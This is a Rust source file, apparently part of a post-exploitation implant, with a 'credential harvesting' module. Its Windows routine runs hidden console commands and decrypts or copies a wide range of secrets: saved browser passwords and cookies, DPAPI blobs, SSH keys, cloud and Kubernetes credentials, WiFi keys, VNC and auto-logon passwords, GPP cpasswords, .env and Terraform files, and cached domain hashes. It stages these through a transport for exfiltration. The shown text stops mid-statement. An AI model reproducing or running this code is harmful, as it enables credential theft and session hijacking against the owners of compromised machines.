//! Credential harvesting module — passive file-based collection, coerced auth,
//! SAM hive dump, and passive SMB listener for NTLMv2 capture.

use std::sync::{Arc, Mutex};
use crate::{s, sb};
use crate::exec::AgentState;
use crate::transport::SharedTransport;

/// Run `cmd /C <command>` with CREATE_NO_WINDOW to avoid visible console flash.
#[cfg(windows)]
fn _hidden_cmd(command: &str) -> std::io::Result<std::process::Output> {
    use std::os::windows::process::CommandExt;
    std::process::Command::new("cmd")
        .args(["/C", command])
        .creation_flags(0x0800_0000)
        .output()
}

// ── Shared state for credential listeners ─────────────────────────────────────

/// Maximum NTLMv2 hashes to keep per listener ring buffer.
const LISTEN_MAX_HASHES: usize = 100;

/// Active listeners — multiple can run simultaneously (e.g. smb:8445 + http:80).
static LISTENERS: once_cell::sync::Lazy<Mutex<Vec<ListenerEntry>>> =
    once_cell::sync::Lazy::new(|| Mutex::new(Vec::new()));

/// Poisoner stop flag — shared across all listeners, started once.
static POISONER_STOP: once_cell::sync::Lazy<Mutex<Option<Arc<std::sync::atomic::AtomicBool>>>> =
    once_cell::sync::Lazy::new(|| Mutex::new(None));

static LLMNR_RESPONSES: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
static NBNS_RESPONSES:  std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

struct ListenerEntry {
    key:     String,          // "smb:445", "http:80", etc.
    port:    u16,
    proto:   String,
    started: std::time::Instant,
    stop:    Arc<std::sync::atomic::AtomicBool>,
    hashes:  Arc<Mutex<Vec<String>>>,
}

// ══════════════════════════════════════════════════════════════════════════════
// § HARVEST — passive file-based credential collection
// ══════════════════════════════════════════════════════════════════════════════

pub fn harvest(state: &Arc<AgentState>, transport: &SharedTransport, decrypt: bool) -> (String, Vec<crate::protocol::StagedFile>) {
    let mut out = String::new();
    let mut staged_count = 0u32;
    let mut staged_bytes = 0u64;
    let mut staged: Vec<crate::protocol::StagedFile> = Vec::new();
    let mut inline_count = 0u32;
    let mut _hint_dpapi_staged = false;
    let mut _hint_dpapi_nodecrypt = false;
    let mut _hint_ff_masterpass = false;
    let mut _hint_browser_staged = false;
    let mut _hint_no_decrypt = false;
    let mut _hint_mremoteng_staged = false;
    let mut _hint_unattend_staged = false;

    #[cfg(windows)]
    {
        out.push_str("[creds harvest] Windows credential scan");
        if decrypt { out.push_str(" (decrypt: DPAPI decryption enabled)"); }
        else { _hint_no_decrypt = true; }
        out.push('\n');

        let appdata = std::env::var("APPDATA").unwrap_or_default();
        let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let userprofile = std::env::var("USERPROFILE").unwrap_or_default();

        // ── DPAPI credential blobs ──
        if decrypt {
            let mut dpapi_decrypted = 0u32;
            let dpapi_paths = [
                format!("{}\\Microsoft\\Credentials", appdata),
                format!("{}\\Microsoft\\Credentials", localappdata),
            ];
            for dir in &dpapi_paths {
                if let Ok(entries) = std::fs::read_dir(dir) {
                    for entry in entries.flatten() {
                        if entry.path().is_file() {
                            if let Ok(data) = std::fs::read(entry.path()) {
                                if let Some(plain) = _dpapi_unprotect(&data) {
                                    if let Some(cred_line) = _parse_credential_blob(&plain) {
                                        if dpapi_decrypted == 0 { out.push_str("  ─── DPAPI Credentials (decrypted) ───\n"); }
                                        out.push_str(&format!("    {}\n", cred_line));
                                        dpapi_decrypted += 1;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if dpapi_decrypted > 0 {
                out.push_str(&format!("  ✓ DPAPI: {} credential(s) decrypted → inline\n", dpapi_decrypted));
                inline_count += dpapi_decrypted;
            } else {
                out.push_str("  ✗ DPAPI blobs: none decryptable (different logon session?)\n");
                _hint_dpapi_nodecrypt = true;
            }
        } else {
            let dpapi_paths = [
                format!("{}\\Microsoft\\Credentials", appdata),
                format!("{}\\Microsoft\\Credentials", localappdata),
            ];
            for dir in &dpapi_paths {
                let (n, b) = _stage_dir_files(dir, "dpapi_cred", state, transport, &mut staged);
                if n > 0 {
                    out.push_str(&format!("  ✓ DPAPI blobs: {} files ({}) → staged\n", n, _fmt_bytes(b)));
                    staged_count += n; staged_bytes += b;
                    _hint_dpapi_staged = true;
                }
            }
        }

        // DPAPI master keys — always stage (needed for offline crack)
        if let Some(sid) = _get_user_sid() {
            let mk_path = format!("{}\\Microsoft\\Protect\\{}", appdata, sid);
            let (n, b) = _stage_dir_files(&mk_path, &format!("dpapi_masterkey_{}", sid), state, transport, &mut staged);
            if n > 0 {
                out.push_str(&format!("  ✓ DPAPI master keys ({}): {} files ({}) → staged\n", sid, n, _fmt_bytes(b)));
                staged_count += n; staged_bytes += b;
            }
        }

        // ── Chrome/Edge ──
        let browsers: &[(&str, &str, &str)] = &[
            ("Chrome", &format!("{}\\Google\\Chrome\\User Data", localappdata), "chrome"),
            ("Edge", &format!("{}\\Microsoft\\Edge\\User Data", localappdata), "edge"),
        ];
        for (name, base, prefix) in browsers {
            let login_path = format!("{}\\Default\\Login Data", base);
            let local_state_path = format!("{}\\Local State", base);
            if !std::path::Path::new(&login_path).exists() {
                out.push_str(&format!("  ✗ {}: not found\n", name));
                continue;
            }
            if decrypt {
                match _decrypt_chromium(base, &login_path, &local_state_path) {
                    Ok(creds) if !creds.is_empty() => {
                        out.push_str(&format!("  ─── {} Passwords (decrypted) ───\n", name));
                        for c in &creds { out.push_str(&format!("    {} | {} | {}\n", c.0, c.1, c.2)); }
                        out.push_str(&format!("  ✓ {}: {} password(s) decrypted → inline\n", name, creds.len()));
                        inline_count += creds.len() as u32;
                    }
                    Ok(_) => { out.push_str(&format!("  ✓ {}: database accessible but no saved passwords\n", name)); }
                    Err(e) => {
                        out.push_str(&format!("  ⚠ {} decrypt failed ({}), falling back to staging\n", name, e));
                        if let Some(b) = _stage_file(&login_path, prefix, state, transport, &mut staged) {
                            staged_count += 1; staged_bytes += b;
                        }
                        if let Some(b) = _stage_file(&local_state_path, prefix, state, transport, &mut staged) {
                            staged_count += 1; staged_bytes += b;
                        }
                        _hint_browser_staged = true;
                    }
                }
            } else {
                if let Some(b) = _stage_file(&login_path, prefix, state, transport, &mut staged) {
                    out.push_str(&format!("  ✓ {} Login Data: ({}) → staged\n", name, _fmt_bytes(b)));
                    staged_count += 1; staged_bytes += b;
                    _hint_browser_staged = true;
                }
            }
        }

        // ── Firefox ──
        let ff_dir = format!("{}\\Mozilla\\Firefox\\Profiles", appdata);
        let ff_result = _harvest_firefox_parsed(&ff_dir);
        if !ff_result.is_empty() {
            out.push_str("  ─── Firefox Passwords ───\n");
            for c in &ff_result { out.push_str(&format!("    {} | {} | {}\n", c.0, c.1, c.2)); }
            out.push_str(&format!("  ✓ Firefox: {} password(s) decrypted → inline\n", ff_result.len()));
            inline_count += ff_result.len() as u32;
        } else {
            let (n, b) = _stage_firefox(&ff_dir, state, transport, &mut staged);
            if n > 0 {
                out.push_str(&format!("  ✓ Firefox: {} files ({}) → staged (master password set or parse error)\n", n, _fmt_bytes(b)));
                staged_count += n; staged_bytes += b;
                _hint_ff_masterpass = true;
            } else {
                out.push_str("  ✗ Firefox: not found\n");
            }
        }

        // ── WiFi profiles ──
        let wifi = _harvest_wifi_windows();
        if !wifi.is_empty() {
            let wifi_n = wifi.lines().count();
            out.push_str("  ─── WiFi Profiles ───\n");
            out.push_str(&wifi);
            out.push_str(&format!("  ✓ WiFi: {} profile(s) → inline\n", wifi_n));
            inline_count += wifi_n as u32;
        }

        // ── RDP files ──
        let rdp_dir = format!("{}\\Documents", userprofile);
        let (n, _) = _stage_glob(&rdp_dir, "*.rdp", "rdp", state, transport, &mut staged);
        if n > 0 { out.push_str(&format!("  ✓ RDP: {} file(s) → staged\n", n)); staged_count += n; }

        // ── Windows Vault ──
        let vault_path = format!("{}\\Microsoft\\Vault", localappdata);
        let (n, b) = _stage_dir_files(&vault_path, "vault", state, transport, &mut staged);
        if n > 0 {
            out.push_str(&format!("  ✓ Windows Vault: {} files ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        }

        // ── SSH keys (Windows) ──
        let ssh_dir = format!("{}\\.ssh", userprofile);
        let ssh_files = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                         "id_rsa.pub", "id_ed25519.pub", "config", "known_hosts"];
        let mut ssh_n = 0u32;
        let mut ssh_info = Vec::new();
        for f in &ssh_files {
            let p = format!("{}\\{}", ssh_dir, f);
            if let Ok(data) = std::fs::read(&p) {
                if data.is_empty() { continue; }
                let is_pub = f.ends_with(".pub");
                let is_config = *f == "config" || *f == "known_hosts";
                let enc = if !is_pub && !is_config { _ssh_key_encrypted(&data) } else { false };
                let label = if enc { "ENCRYPTED" } else if is_pub { "public" } else if is_config { "config" } else { "PLAINTEXT" };
                ssh_info.push(format!("    {} ({})", f, label));
                if let Some(b) = _stage_file(&p, "ssh", state, transport, &mut staged) {
                    ssh_n += 1; staged_bytes += b;
                }
            }
        }
        if ssh_n > 0 {
            out.push_str("  ─── SSH Keys ───\n");
            for info in &ssh_info { out.push_str(&format!("{}\n", info)); }
            out.push_str(&format!("  ✓ SSH: {} file(s) → staged\n", ssh_n));
            staged_count += ssh_n;
        }

        // ── Cloud credentials (Windows paths) ──
        let aws_creds_path = format!("{}\\.aws\\credentials", userprofile);
        let aws_config_path = format!("{}\\.aws\\config", userprofile);
        for p in [&aws_creds_path, &aws_config_path] {
            if let Ok(content) = std::fs::read_to_string(p) {
                if !content.trim().is_empty() {
                    let parsed = _parse_aws_creds(&content);
                    if !parsed.is_empty() {
                        out.push_str("  ─── AWS ───\n");
                        out.push_str(&parsed);
                        out.push_str("  ✓ AWS: parsed → inline\n");
                        inline_count += 1;
                        break;
                    }
                }
            }
        }

        let azure_paths = [
            format!("{}\\Microsoft\\Azure\\accessTokens.json", localappdata),
            format!("{}\\Microsoft\\Azure\\msal_token_cache.json", localappdata),
            format!("{}\\.azure\\accessTokens.json", userprofile),
            format!("{}\\.azure\\msal_token_cache.json", userprofile),
        ];
        for p in &azure_paths {
            if let Some(b) = _stage_file(p, "azure", state, transport, &mut staged) {
                out.push_str(&format!("  ✓ Azure token cache: ({}) → staged\n", _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
            }
        }

        let gcloud_paths = [
            format!("{}\\gcloud\\credentials.db", appdata),
            format!("{}\\gcloud\\access_tokens.db", appdata),
            format!("{}\\gcloud\\application_default_credentials.json", appdata),
        ];
        for p in &gcloud_paths {
            if let Some(b) = _stage_file(p, "gcloud", state, transport, &mut staged) {
                out.push_str(&format!("  ✓ GCloud: ({}) → staged\n", _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
            }
        }

        let docker_cfg = format!("{}\\.docker\\config.json", userprofile);
        if let Ok(content) = std::fs::read_to_string(&docker_cfg) {
            if !content.trim().is_empty() {
                let parsed = _parse_docker_config_win(&content);
                if !parsed.is_empty() {
                    out.push_str("  ─── Docker ───\n");
                    out.push_str(&parsed);
                    out.push_str("  ✓ Docker: parsed → inline\n");
                    inline_count += 1;
                }
            }
        }

        let kube_cfg = format!("{}\\.kube\\config", userprofile);
        if let Ok(content) = std::fs::read_to_string(&kube_cfg) {
            if !content.trim().is_empty() {
                let parsed = _parse_kube_config_win(&content);
                if !parsed.is_empty() {
                    out.push_str("  ─── Kubernetes ───\n");
                    out.push_str(&parsed);
                    out.push_str("  ✓ Kubernetes: parsed → inline\n");
                    inline_count += 1;
                }
            }
        }

        // ── Git credentials ──
        let git_paths = [
            format!("{}\\.git-credentials", userprofile),
            format!("{}\\.config\\git\\credentials", userprofile),
        ];
        for p in &git_paths {
            if let Ok(content) = std::fs::read_to_string(p) {
                if !content.trim().is_empty() {
                    out.push_str("  ─── Git Credentials ───\n");
                    for line in content.lines().take(20) { out.push_str(&format!("    {}\n", line)); }
                    out.push_str(&format!("  ✓ Git creds: {} → inline\n", p));
                    inline_count += 1;
                }
            }
        }

        // ── FileZilla saved credentials ──
        let fz_paths = [
            format!("{}\\FileZilla\\recentservers.xml", appdata),
            format!("{}\\FileZilla\\sitemanager.xml", appdata),
        ];
        let mut fz_count = 0u32;
        for p in &fz_paths {
            if let Ok(content) = std::fs::read_to_string(p) {
                let parsed = _parse_filezilla_xml(&content);
                if !parsed.is_empty() {
                    if fz_count == 0 { out.push_str("  ─── FileZilla ───\n"); }
                    out.push_str(&parsed);
                    fz_count += 1;
                }
            }
        }
        if fz_count > 0 {
            out.push_str("  ✓ FileZilla: credentials → inline\n");
            inline_count += 1;
        }

        // ── mRemoteNG saved connections ──
        let mremote_path = format!("{}\\mRemoteNG\\confCons.xml", appdata);
        if std::path::Path::new(&mremote_path).exists() {
            if let Some(b) = _stage_file(&mremote_path, "mremoteng", state, transport, &mut staged) {
                out.push_str(&format!("  ✓ mRemoteNG confCons.xml: ({}) → staged (default key: mR3m)\n", _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
                _hint_mremoteng_staged = true;
            }
        }

        // ── PowerShell history (secrets grep) ──
        let ps_hist_path = format!("{}\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", appdata);
        if let Ok(content) = std::fs::read_to_string(&ps_hist_path) {
            let ps_secrets = _grep_ps_history(&content);
            if !ps_secrets.is_empty() {
                out.push_str("  ─── PowerShell History Secrets ───\n");
                let capped: String = ps_secrets.lines().take(50).collect::<Vec<_>>().join("\n");
                out.push_str(&capped);
                out.push_str(&format!("\n  ✓ PS history: {} line(s) → inline\n", ps_secrets.lines().count().min(50)));
                inline_count += 1;
            }
        }

        // ── Unattend/Sysprep files ──
        let unattend_paths = [
            "C:\\Windows\\Panther\\unattend.xml",
            "C:\\Windows\\Panther\\Unattend\\unattend.xml",
            "C:\\Windows\\System32\\Sysprep\\unattend.xml",
            "C:\\Windows\\System32\\Sysprep\\sysprep.xml",
        ];
        for p in &unattend_paths {
            if let Ok(content) = std::fs::read_to_string(p) {
                let lower = content.to_lowercase();
                if lower.contains("password") || lower.contains("cpassword") {
                    if let Some(b) = _stage_file(p, "unattend", state, transport, &mut staged) {
                        out.push_str(&format!("  ✓ Unattend (creds found): {} ({}) → staged\n", p, _fmt_bytes(b)));
                        staged_count += 1; staged_bytes += b;
                        _hint_unattend_staged = true;
                    }
                }
            }
        }

        // ── PuTTY saved sessions ──
        if let Ok(o) = _hidden_cmd("reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions") {
            if o.status.success() {
                let txt = String::from_utf8_lossy(&o.stdout);
                let sessions: Vec<&str> = txt.lines()
                    .filter(|l| l.contains("HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\"))
                    .collect();
                if !sessions.is_empty() {
                    out.push_str("  ─── PuTTY Sessions ───\n");
                    for sess_key in &sessions {
                        let sess_name = sess_key.rsplit('\\').next().unwrap_or("?");
                        let mut host = String::new();
                        let mut user = String::new();
                        if let Ok(o2) = _hidden_cmd(&format!("reg query \"{}\" /v HostName", sess_key.trim())) {
                            if let Some(val) = _reg_extract_value(&String::from_utf8_lossy(&o2.stdout)) { host = val; }
                        }
                        if let Ok(o2) = _hidden_cmd(&format!("reg query \"{}\" /v UserName", sess_key.trim())) {
                            if let Some(val) = _reg_extract_value(&String::from_utf8_lossy(&o2.stdout)) { user = val; }
                        }
                        if !host.is_empty() || !user.is_empty() {
                            out.push_str(&format!("    {} → {}@{}\n", sess_name, if user.is_empty() { "?" } else { &user }, if host.is_empty() { "?" } else { &host }));
                        }
                    }
                    out.push_str(&format!("  ✓ PuTTY: {} session(s) → inline\n", sessions.len()));
                    inline_count += sessions.len() as u32;
                }
            }
        }

        // ── WinSCP saved sessions ──
        let winscp_ini = format!("{}\\WinSCP.ini", appdata);
        if std::path::Path::new(&winscp_ini).exists() {
            if let Some(b) = _stage_file(&winscp_ini, "winscp", state, transport, &mut staged) {
                out.push_str(&format!("  ✓ WinSCP.ini: ({}) → staged (passwords XOR-encrypted, trivially reversible)\n", _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
            }
        } else if let Ok(o) = _hidden_cmd("reg query HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions") {
            if o.status.success() {
                let txt = String::from_utf8_lossy(&o.stdout);
                let sessions: Vec<&str> = txt.lines()
                    .filter(|l| l.contains("\\Sessions\\") && !l.trim().is_empty())
                    .filter(|l| !l.trim().starts_with("(") && !l.contains("REG_"))
                    .collect();
                if !sessions.is_empty() {
                    out.push_str("  ─── WinSCP Sessions ───\n");
                    for sess_key in &sessions {
                        let sess_name = sess_key.rsplit('\\').next().unwrap_or("?");
                        let mut host = String::new();
                        let mut user = String::new();
                        if let Ok(o2) = _hidden_cmd(&format!("reg query \"{}\" /v HostName", sess_key.trim())) {
                            if let Some(val) = _reg_extract_value(&String::from_utf8_lossy(&o2.stdout)) { host = val; }
                        }
                        if let Ok(o2) = _hidden_cmd(&format!("reg query \"{}\" /v UserName", sess_key.trim())) {
                            if let Some(val) = _reg_extract_value(&String::from_utf8_lossy(&o2.stdout)) { user = val; }
                        }
                        if !host.is_empty() || !user.is_empty() {
                            out.push_str(&format!("    {} → {}@{}\n", sess_name, if user.is_empty() { "?" } else { &user }, if host.is_empty() { "?" } else { &host }));
                        }
                    }
                    out.push_str(&format!("  ✓ WinSCP: {} session(s) → inline\n", sessions.len()));
                    inline_count += sessions.len() as u32;
                }
            }
        }

        // ── VNC passwords (registry, DES with known key) ──
        let vnc_keys = [
            ("RealVNC", "HKLM\\SOFTWARE\\RealVNC\\WinVNC4", "Password"),
            ("RealVNC-user", "HKCU\\SOFTWARE\\RealVNC\\WinVNC4", "Password"),
            ("TightVNC", "HKLM\\SOFTWARE\\TightVNC\\Server", "Password"),
            ("TightVNC-ctrl", "HKLM\\SOFTWARE\\TightVNC\\Server", "ControlPassword"),
            ("UltraVNC", "HKLM\\SOFTWARE\\ORL\\WinVNC3\\Default", "Password"),
        ];
        let mut vnc_found = 0u32;
        for (label, key, val_name) in &vnc_keys {
            if let Ok(o) = _hidden_cmd(&format!("reg query \"{}\" /v {}", key, val_name)) {
                if o.status.success() {
                    let txt = String::from_utf8_lossy(&o.stdout);
                    if let Some(hex_val) = _reg_extract_value(&txt) {
                        if !hex_val.is_empty() && hex_val != "0" {
                            if vnc_found == 0 { out.push_str("  ─── VNC Passwords ───\n"); }
                            let decrypted = _vnc_des_decrypt(&hex_val);
                            out.push_str(&format!("    {} → {}\n", label, if decrypted.is_empty() { &hex_val } else { &decrypted }));
                            vnc_found += 1;
                        }
                    }
                }
            }
        }
        let ultravnc_ini = format!("{}\\UltraVNC\\ultravnc.ini", std::env::var("PROGRAMFILES").unwrap_or_default());
        if std::path::Path::new(&ultravnc_ini).exists() {
            if let Some(b) = _stage_file(&ultravnc_ini, "vnc", state, transport, &mut staged) {
                if vnc_found == 0 { out.push_str("  ─── VNC Passwords ───\n"); }
                out.push_str(&format!("    UltraVNC ini: ({}) → staged\n", _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
                vnc_found += 1;
            }
        }
        if vnc_found > 0 {
            out.push_str(&format!("  ✓ VNC: {} source(s) → inline\n", vnc_found));
            inline_count += vnc_found;
        }

        // ── WinLogon auto-logon ──
        if let Ok(o) = _hidden_cmd("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword") {
            if o.status.success() {
                let txt = String::from_utf8_lossy(&o.stdout);
                if let Some(pwd) = _reg_extract_value(&txt) {
                    if !pwd.is_empty() {
                        let mut domain = String::new();
                        let mut user = String::new();
                        if let Ok(o2) = _hidden_cmd("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName") {
                            if let Some(v) = _reg_extract_value(&String::from_utf8_lossy(&o2.stdout)) { domain = v; }
                        }
                        if let Ok(o2) = _hidden_cmd("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName") {
                            if let Some(v) = _reg_extract_value(&String::from_utf8_lossy(&o2.stdout)) { user = v; }
                        }
                        out.push_str("  ─── WinLogon Auto-Logon ───\n");
                        out.push_str(&format!("    {}\\{} → {}\n", domain, user, pwd));
                        out.push_str("  ✓ WinLogon: auto-logon password → inline\n");
                        inline_count += 1;
                    }
                }
            }
        }

        // ── cmdkey /list — saved credential targets ──
        if let Ok(o) = _hidden_cmd("cmdkey /list") {
            if o.status.success() {
                let txt = String::from_utf8_lossy(&o.stdout);
                let targets: Vec<&str> = txt.lines()
                    .filter(|l| l.trim().starts_with("Target:") || l.trim().starts_with("User:"))
                    .collect();
                if !targets.is_empty() {
                    out.push_str("  ─── Saved Credential Targets (cmdkey) ───\n");
                    for line in &targets { out.push_str(&format!("    {}\n", line.trim())); }
                    out.push_str(&format!("  ✓ cmdkey: {} entry(ies) → inline\n", targets.len() / 2));
                    inline_count += 1;
                }
            }
        }

        // ── RDP MRU + saved hosts ──
        if let Ok(o) = _hidden_cmd("reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\"") {
            if o.status.success() {
                let txt = String::from_utf8_lossy(&o.stdout);
                let hosts: Vec<&str> = txt.lines()
                    .filter(|l| l.contains("\\Servers\\") && !l.trim().is_empty())
                    .filter(|l| !l.trim().starts_with("(") && !l.contains("REG_"))
                    .collect();
                if !hosts.is_empty() {
                    out.push_str("  ─── RDP Recent Hosts ───\n");
                    for host_key in &hosts {
                        let host = host_key.rsplit('\\').next().unwrap_or("?");
                        let mut user = String::new();
                        if let Ok(o2) = _hidden_cmd(&format!("reg query \"{}\" /v UsernameHint", host_key.trim())) {
                            if let Some(val) = _reg_extract_value(&String::from_utf8_lossy(&o2.stdout)) { user = val; }
                        }
                        out.push_str(&format!("    {} (last user: {})\n", host, if user.is_empty() { "?" } else { &user }));
                    }
                    out.push_str(&format!("  ✓ RDP MRU: {} host(s) → inline\n", hosts.len()));
                    inline_count += 1;
                }
            }
        }

        // ── IIS web.config ──
        let webconfig_paths = [
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config",
        ];
        for p in &webconfig_paths {
            if let Ok(content) = std::fs::read_to_string(p) {
                let lower = content.to_lowercase();
                if lower.contains("password") || lower.contains("connectionstring") {
                    if let Some(b) = _stage_file(p, "webconfig", state, transport, &mut staged) {
                        out.push_str(&format!("  ✓ IIS web.config (creds found): {} ({}) → staged\n", p, _fmt_bytes(b)));
                        staged_count += 1; staged_bytes += b;
                    }
                }
            }
        }

        // ── Sticky Notes (plum.sqlite) ──
        let sticky_glob = format!("{}\\Packages", localappdata);
        if let Ok(entries) = std::fs::read_dir(&sticky_glob) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with("Microsoft.MicrosoftStickyNotes_") {
                    let plum = format!("{}\\LocalState\\plum.sqlite", entry.path().display());
                    if std::path::Path::new(&plum).exists() {
                        if let Some(b) = _stage_file(&plum, "stickynotes", state, transport, &mut staged) {
                            out.push_str(&format!("  ✓ Sticky Notes plum.sqlite: ({}) → staged (check Note column for passwords)\n", _fmt_bytes(b)));
                            staged_count += 1; staged_bytes += b;
                        }
                    }
                }
            }
        }

        // ── GPP cpassword (SYSVOL) ──
        if let Ok(logon_server) = std::env::var("LOGONSERVER") {
            let sysvol = format!("{}\\SYSVOL", logon_server.trim_start_matches('\\'));
            let gpp_files = ["Groups.xml", "Services.xml", "Scheduledtasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml"];
            let mut gpp_found = 0u32;
            if let Ok(o) = _hidden_cmd(&format!("dir /s /b \"{}\\*.xml\" 2>nul", sysvol)) {
                if o.status.success() {
                    let txt = String::from_utf8_lossy(&o.stdout);
                    for line in txt.lines() {
                        let fname = line.rsplit('\\').next().unwrap_or("");
                        if gpp_files.iter().any(|g| g.eq_ignore_ascii_case(fname)) {
                            if let Ok(content) = std::fs::read_to_string(line.trim()) {
                                if content.to_lowercase().contains("cpassword") {
                                    if let Some(b) = _stage_file(line.trim(), "gpp", state, transport, &mut staged) {
                                        if gpp_found == 0 { out.push_str("  ─── GPP cpassword (SYSVOL) ───\n"); }
                                        out.push_str(&format!("    {} ({}) → staged\n", fname, _fmt_bytes(b)));
                                        staged_count += 1; staged_bytes += b;
                                        gpp_found += 1;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if gpp_found > 0 {
                out.push_str(&format!("  ✓ GPP: {} file(s) with cpassword → staged (decrypt: gpp-decrypt <cpassword>)\n", gpp_found));
            }
        }

        // ── .env files (Windows) ──
        let env_search_dirs = [
            format!("{}\\source\\repos", userprofile),
            format!("{}\\Documents", userprofile),
            format!("{}\\Desktop", userprofile),
        ];
        let mut env_found = 0u32;
        for dir in &env_search_dirs {
            if let Ok(o) = _hidden_cmd(&format!("dir /s /b \"{}\" 2>nul", format!("{}\\*.env", dir))) {
                if o.status.success() {
                    for line in String::from_utf8_lossy(&o.stdout).lines() {
                        let p = line.trim();
                        if p.is_empty() { continue; }
                        if let Ok(content) = std::fs::read_to_string(p) {
                            let lower = content.to_lowercase();
                            if lower.contains("password") || lower.contains("secret") || lower.contains("api_key") || lower.contains("token") {
                                if let Some(b) = _stage_file(p, "dotenv", state, transport, &mut staged) {
                                    if env_found == 0 { out.push_str("  ─── .env Files ───\n"); }
                                    out.push_str(&format!("    {} ({}) → staged\n", p, _fmt_bytes(b)));
                                    staged_count += 1; staged_bytes += b;
                                    env_found += 1;
                                    if env_found >= 10 { break; }
                                }
                            }
                        }
                    }
                }
            }
            if env_found >= 10 { break; }
        }
        if env_found > 0 { out.push_str(&format!("  ✓ .env: {} file(s) with secrets → staged\n", env_found)); }

        // ── Terraform state files (Windows) ──
        let tf_search_dirs = [
            format!("{}\\source\\repos", userprofile),
            format!("{}\\Documents", userprofile),
        ];
        let mut tf_found = 0u32;
        for dir in &tf_search_dirs {
            if let Ok(o) = _hidden_cmd(&format!("dir /s /b \"{}\\*.tfstate\" 2>nul", dir)) {
                if o.status.success() {
                    for line in String::from_utf8_lossy(&o.stdout).lines() {
                        let p = line.trim();
                        if p.is_empty() { continue; }
                        if let Some(b) = _stage_file(p, "terraform", state, transport, &mut staged) {
                            if tf_found == 0 { out.push_str("  ─── Terraform State ───\n"); }
                            out.push_str(&format!("    {} ({}) → staged\n", p, _fmt_bytes(b)));
                            staged_count += 1; staged_bytes += b;
                            tf_found += 1;
                            if tf_found >= 5 { break; }
                        }
                    }
                }
            }
            if tf_found >= 5 { break; }
        }
        if tf_found > 0 { out.push_str(&format!("  ✓ Terraform: {} state file(s) → staged (contains cloud creds in plaintext JSON)\n", tf_found)); }

        // ── Chrome/Edge cookies (session hijack) ──
        let cookie_browsers: &[(&str, &str, &str)] = &[
            ("Chrome", &format!("{}\\Google\\Chrome\\User Data", localappdata), "chrome_cookies"),
            ("Edge", &format!("{}\\Microsoft\\Edge\\User Data", localappdata), "edge_cookies"),
        ];
        for (name, base, prefix) in cookie_browsers {
            let cookie_path = format!("{}\\Default\\Network\\Cookies", base);
            if std::path::Path::new(&cookie_path).exists() {
                if let Some(b) = _stage_file(&cookie_path, prefix, state, transport, &mut staged) {
                    out.push_str(&format!("  ✓ {} Cookies: ({}) → staged (session tokens for O365, GitHub, etc.)\n", name, _fmt_bytes(b)));
                    staged_count += 1; staged_bytes += b;
                }
            }
        }

        // ── Recycle Bin scan ──
        if let Ok(o) = _hidden_cmd("dir /s /b C:\\$RECYCLE.BIN\\*.xml C:\\$RECYCLE.BIN\\*.config C:\\$RECYCLE.BIN\\*.txt C:\\$RECYCLE.BIN\\*.ini C:\\$RECYCLE.BIN\\*.rdp 2>nul") {
            if o.status.success() {
                let txt = String::from_utf8_lossy(&o.stdout);
                let files: Vec<&str> = txt.lines().filter(|l| !l.trim().is_empty()).collect();
                if !files.is_empty() {
                    out.push_str("  ─── Recycle Bin (interesting files) ───\n");
                    let mut rb_staged = 0u32;
                    for f in files.iter().take(10) {
                        if let Ok(content) = std::fs::read_to_string(f.trim()) {
                            let lower = content.to_lowercase();
                            if lower.contains("password") || lower.contains("credential") || lower.contains("secret") || f.ends_with(".rdp") {
                                if let Some(b) = _stage_file(f.trim(), "recyclebin", state, transport, &mut staged) {
                                    out.push_str(&format!("    {} ({}) → staged\n", f.trim().rsplit('\\').next().unwrap_or(f.trim()), _fmt_bytes(b)));
                                    staged_count += 1; staged_bytes += b;
                                    rb_staged += 1;
                                }
                            }
                        }
                    }
                    if rb_staged > 0 { out.push_str(&format!("  ✓ Recycle Bin: {} file(s) with potential secrets → staged\n", rb_staged)); }
                }
            }
        }

        // ── Opera / Brave passwords ──
        let extra_browsers: &[(&str, &str, &str)] = &[
            ("Opera", &format!("{}\\Opera Software\\Opera Stable", appdata), "opera"),
            ("Brave", &format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default", localappdata), "brave"),
        ];
        for (name, base, prefix) in extra_browsers {
            let login_path = format!("{}\\Login Data", base);
            if std::path::Path::new(&login_path).exists() {
                if let Some(b) = _stage_file(&login_path, prefix, state, transport, &mut staged) {
                    out.push_str(&format!("  ✓ {} Login Data: ({}) → staged\n", name, _fmt_bytes(b)));
                    staged_count += 1; staged_bytes += b;
                }
            }
        }

        // ── MsCacheV2/DCC2 hashes (SECURITY hive, SYSTEM-only) ──
        if let Ok(o) = _hidden_cmd("reg query HKLM\\SECURITY\\Cache") {
            if o.status.success() {
                let txt = String::from_utf8_lossy(&o.stdout);
                let entries: Vec<&str> = txt.lines()
                    .filter(|l| l.contains("REG_BINARY") && l.trim().starts_with("NL$"))
                    .collect();
                if !entries.is_empty() {
                    out.push_str("  ─── MsCacheV2/DCC2 (cached domain logons) ───\n");
                    for e in entries.iter().take(20) {
                        let trimmed = e.trim();
